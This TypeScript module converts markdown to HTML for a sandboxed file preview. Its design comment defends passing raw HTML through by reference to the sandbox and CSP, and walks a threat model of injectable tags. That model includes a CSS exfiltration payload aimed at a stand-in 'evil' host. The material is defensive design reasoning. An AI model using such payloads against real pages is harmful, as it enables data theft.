import { Marked } from 'marked';
import type { RendererObject } from 'marked';
import { markdownStylesheet, type PreviewStyle } from './previewStyle.js';

/**
 * Markdown -> a complete HTML document, converted in MAIN, for the same
 * `psview:` pipeline the HTML preview already uses.
 *
 * ## Why this is a reuse and not a second security argument
 *
 * The HTML preview was shipped with markdown deliberately deferred, on the
 * grounds that a renderer would need "its own sanitisation story, which is a
 * second security argument, not a reuse of this one". Re-examined, that is
 * wrong, and the reason is worth stating precisely because the instinct to
 * re-argue it will come back.
 *
 * Every guarantee the HTML preview rests on is a property of HOW BYTES ARE
 * SERVED, not of where they came from:
 *
 *   - `sandbox=""` with zero tokens, set by the renderer on the frame, so no
 *     script executes whatever the document says;
 *   - a per-response `Content-Security-Policy` naming no remote scheme, so the
 *     document reaches no network at all;
 *   - traversal defended twice — folded on the string, then re-resolved with
 *     `realpath` on the host — so the paths a document can name are always
 *     canonical and well-formed. For an HTML preview they are also confined to
 *     the previewed file's own folder; a markdown preview is bounded by the
 *     host instead, because a README is cross-referenced by `../` and absolute
 *     paths and every file it can name is one the user can already open in the
 *     Files tab (see HtmlPreviewService's mint for that decision).
 *
 * None of those three asks what produced the HTML. A markdown file converted to
 * HTML and handed to that pipeline inherits all of them unchanged, and its
 * relative images resolve exactly as a `<img src="diagram.png">` in a real page
 * does, because they become exactly that. So the residual question is not "how
 * do we sanitise markdown" — it is the much smaller "what is the converter
 * allowed to emit", which is answered below and is the only genuinely new
 * decision in the feature.
 *
 * ## Why the conversion happens HERE, in main
 *
 * Three reasons, in order of weight.
 *
 *  1. **The served bytes stay plain HTML.** The preview scheme's contract is
 *     "a document and the things it references, over SFTP, inside one folder".
 *     Converting before serving keeps that contract literally true: the frame
 *     receives `text/html` on `psview:` exactly as it does for a real page, and
 *     every property listed above applies without a special case.
 *  2. **The renderer never grows the dependency.** The Files tab already pays
 *     680 KB for CodeMirror behind `defineAsyncComponent`; adding a markdown
 *     parser to the renderer would either grow the entry chunk or add a second
 *     lazy chunk with its own loading state, for a job that has to happen
 *     before the frame navigates anyway. In main it is 45 KB in a bundle that
 *     is loaded once, at launch, before any window exists.
 *  3. **Relative links to other markdown files can work.** Conversion in the
 *     renderer would produce ONE document; conversion in the request handler
 *     converts whichever `.md` the frame asks for next, so `[design](DESIGN.md)`
 *     navigates rather than dead-ends. See the note on that in
 *     HtmlPreviewService.
 *
 * ## Raw HTML inside markdown is ALLOWED, deliberately
 *
 * Most converters pass raw HTML through; marked does, and `sanitize` was
 * removed from its options years ago in favour of "sanitise the output if you
 * need to". We do not need to, and the argument is the one above turned around:
 *
 * The pipeline ALREADY serves arbitrary, attacker-authored HTML — that is what
 * previewing an `.html` file off an untrusted host IS. Escaping raw HTML in
 * markdown would therefore not remove a threat from the system; it would remove
 * it from one of two doors into the same room, while leaving the room's actual
 * walls (sandbox, CSP, containment) doing all the work they already do. Run
 * through what raw HTML in a README could try:
 *
 *   `<script>`            refused twice — `sandbox=""` blocks execution, and
 *                         `script-src 'none'` blocks it again from the header.
 *   `<img src="https:…">` refused by `img-src`, which names no remote scheme.
 *   `<iframe>`            refused by `frame-src 'none'`.
 *   `<form>`              refused by `form-action 'none'`.
 *   `<base href="…">`     refused by `base-uri 'none'` — the one tag that could
 *                         otherwise re-point every relative URL out of scope.
 *   `<object>/<embed>`    refused by `object-src 'none'`.
 *   `<style>`, `style=`   ALLOWED, by `'unsafe-inline'`, exactly as for an HTML
 *                         file. A document can therefore restyle itself into
 *                         something that looks like something else — but it
 *                         cannot exfiltrate what it read, because no directive
 *                         on the policy permits a remote URL for anything,
 *                         which is what makes the classic
 *                         `background:url(https://evil/?leak)` inert.
 *   `<a href="https:…">`  Navigates the frame; main hands a WEB url to the
 *                         system browser (`will-frame-navigate` in index.ts,
 *                         the same allow-list window.open goes through) and
 *                         refuses the in-app navigation. The preview itself
 *                         never touches the network.
 *   local `<img src>`     Reads a file on the host and shows it TO THE USER,
 *                         who is browsing that host over SFTP and can already
 *                         read it. No new capability.
 *
 * What escaping WOULD cost is not hypothetical: `<details><summary>`,
 * `<img width>`, `<p align="center">`, `<br>` and badge tables are how real
 * READMEs are written, and a preview that renders them as literal angle
 * brackets is a worse preview than no preview. Strip-instead-of-escape is worse
 * still — it silently deletes content, which is the one failure mode this
 * feature's toolbar line exists to prevent.
 *
 * If this is ever revisited: escaping is a one-line change (`renderer.html` and
 * `renderer.text` returning escaped text), and it is the RIGHT change only if
 * the sandbox or the CSP is ever weakened. They are load-bearing together, and
 * this decision is downstream of both.
 *
 * ## Styling
 *
 * A markdown preview with no stylesheet is a wall of Times New Roman on white,
 * which reads as broken next to the app. The document therefore carries a small
 * inline stylesheet in the APP'S OWN TOKENS — see previewStyle.ts, which owns
 * the palette, its validation and the CSS, and which is a separate module
 * precisely so the renderer can share the token names without importing the
 * parser.
 *
 * Inline rather than a second `psview:` URL, on purpose: a synthetic path would
 * have to be one that cannot collide with a real file in the previewed folder,
 * and `'unsafe-inline'` for styles is already granted to the frame, so a
 * separate request would buy nothing and cost a name.
 */

export interface MarkdownDocumentOptions {
  /** Shown as the document title; never rendered into the body. */
  title: string;
  style: PreviewStyle;
}

/**
 * How the converter is configured, everywhere it is used.
 *
 *   gfm       tables, strikethrough, task lists and autolinks — what people
 *             mean by "markdown" on a dev box, and what every README is
 *             written against.
 *   breaks    OFF, which is CommonMark's rule and GitHub's for `.md` FILES
 *             (as opposed to comment boxes): a hard-wrapped paragraph is one
 *             paragraph, and turning every source newline into a `<br>` would
 *             shred every README wrapped at 80 columns.
 *   pedantic  OFF. It re-enables original-markdown.pl bugs.
 *   async     OFF so `parse` returns a string; nothing here is async, and the
 *             union return type would otherwise leak into the request handler.
 *
 * A private `Marked` INSTANCE is built per document rather than calling the
 * module-level `marked` singleton, because `marked.use()` mutates global state
 * — and in a process that also runs SSH, SFTP and the port forwarder, shared
 * mutable configuration is the sort of thing that is fine until something else
 * wants a different setting and the two silently fight. Per-document is
 * additionally required here: the heading-id renderer below carries
 * duplicate-tracking state that must not leak from one file into the next.
 */
const OPTIONS = { gfm: true, breaks: false, pedantic: false, async: false } as const;

/**
 * Heading ids, so in-document anchors work.
 *
 * Without them `[jump](#install)` does nothing, which is a common shape in
 * every README with a table of contents — and a fragment link is the one kind
 * of navigation that needs no script and no network, so it is free to support.
 * marked stopped emitting ids in v5; this is the standard replacement, kept
 * here rather than pulling `marked-gfm-heading-id` in for eight lines.
 *
 * The slug is derived from the heading's TEXT (via marked's own text renderer,
 * so `## \`code\` and *emphasis*` slugs as `code-and-emphasis`), lowercased,
 * with everything outside `[a-z0-9]` collapsed to a single hyphen. Duplicates
 * get a numeric suffix, per-document, because two `## Usage` headings under one
 * id would make the first one unreachable.
 */
function headingRenderer(): RendererObject {
  const seen = new Map<string, number>();
  return {
    heading(token) {
      const plain = this.parser.parseInline(token.tokens, this.parser.textRenderer);
      const base = plain
        .toLowerCase()
        .replace(/[^a-z0-9]+/g, '-')
        .replace(/^-+|-+$/g, '');
      const count = seen.get(base) ?? 0;
      seen.set(base, count + 1);
      // An empty base (a heading that is only punctuation or an image) would
      // slug to `""`; `section` keeps every heading addressable.
      const stem = base === '' ? 'section' : base;
      const id = count === 0 ? stem : `${stem}-${count}`;
      const body = this.parser.parseInline(token.tokens);
      return `<h${token.depth} id="${id}">${body}</h${token.depth}>\n`;
    },
  };
}

/** HTML-escape for the few places this file interpolates text of its own. */
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/**
 * Convert one markdown source into a complete, self-contained HTML document.
 *
 * Pure: no Electron, no SFTP, no clock, no randomness — so the emit surface
 * this file's header argues about can be asserted exhaustively in a unit test
 * rather than reasoned about.
 */
export function markdownToHtml(source: string, options: MarkdownDocumentOptions): string {
  // A fresh instance per document — see OPTIONS. Instantiating marked is cheap
  // (its rule tables are module-level statics) and one preview is one user
  // action, not a hot loop.
  const doc = new Marked(OPTIONS);
  doc.use({ renderer: headingRenderer() });
  const body = doc.parse(source) as string;
  return [
    '<!doctype html>',
    `<html lang="en"><head><meta charset="utf-8">`,
    `<title>${escapeHtml(options.title)}</title>`,
    `<style>${markdownStylesheet(options.style)}</style>`,
    '</head><body><main class="md">',
    body,
    '</main></body></html>',
  ].join('');
}
